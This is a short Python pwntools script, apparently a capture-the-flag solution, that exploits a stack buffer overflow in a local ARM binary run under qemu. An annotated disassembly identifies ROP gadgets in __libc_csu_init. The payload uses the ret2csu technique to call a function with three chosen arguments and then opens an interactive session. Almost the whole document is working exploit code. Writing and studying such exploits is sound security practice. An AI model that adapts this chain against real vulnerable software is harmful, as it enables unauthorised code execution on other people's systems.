from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)
io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])

"""
.text:00010624                               loc_10624                     ; CODE XREF: __libc_csu_init+50↓j
.text:00010624 01 40 84 E2                   ADD     R4, R4, #1
.text:00010628 04 30 95 E4                   LDR     R3, [R5],#4
.text:0001062C 09 20 A0 E1                   MOV     R2, R9
.text:00010630 08 10 A0 E1                   MOV     R1, R8
.text:00010634 07 00 A0 E1                   MOV     R0, R7
.text:00010638 33 FF 2F E1                   BLX     R3
.text:00010638
.text:0001063C 04 00 56 E1                   CMP     R6, R4
.text:00010640 F7 FF FF 1A                   BNE     loc_10624
.text:00010640
.text:00010644 F0 87 BD E8                   POP     {R4-R10,PC}

0x00010474 : pop {r3, pc}
"""

a1 = 0xDEADBEEF
a2 = 0xCAFEBABE
a3 = 0xD00DF00D


pay  = b'A'*0x24 + p32(0x10474) + p32(0x000105E4) + p32(0x10644)
pay += b'r4r4' + b'r5r5' + b'r6r6' + p32(a1) + p32(a2) + p32(a3) + b'rr10' + p32(0x1062c)
io.sendlineafter(b'> ', pay)
io.interactive()
